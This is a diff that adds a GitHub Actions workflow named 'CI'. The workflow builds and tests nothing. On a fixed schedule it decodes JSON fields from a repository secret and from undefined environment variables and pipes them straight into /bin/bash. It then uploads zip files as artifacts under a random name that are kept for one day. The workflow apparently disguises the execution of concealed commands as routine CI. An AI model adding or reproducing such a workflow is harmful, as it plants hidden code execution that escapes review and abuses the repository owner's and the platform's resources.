@@ -1,0 +1,36 @@
+name: CI
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '22 4,10,16,22 * * *'
+permissions:
+  contents: read
+  actions: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  task:
+    name: Run task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Execute
+        env:
+          tm85: ${{ secrets.tm85 }}
+        run: |
+          printf '%s' "$tm85" | jq -r .i321 | /bin/bash
+          echo $ty810 | jq -r .fkybb1 | /bin/bash
+          echo $jzebk724 | jq -r .zngg09179 | /bin/bash
+          printf '%s' "$vk8" | jq -r .rkxnd0081 | /bin/bash
+
+      - name: Upload artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: gV2bxToP
+          path: "*.zip"
+          retention-days: 1
